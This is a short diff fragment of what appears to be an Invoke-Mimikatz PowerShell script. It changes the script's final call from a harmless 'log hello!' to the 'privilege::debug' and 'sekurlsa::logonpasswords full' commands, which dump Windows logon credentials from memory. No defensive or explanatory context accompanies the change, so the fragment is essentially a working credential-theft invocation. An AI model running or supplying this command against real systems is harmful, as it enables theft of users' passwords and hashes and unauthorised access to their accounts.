@@ -2745,4 +2745,4 @@ Function Main
 
 Main
 }
-Invoke-Mimikatz -Command 'log hello!'
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords full" "exit"'
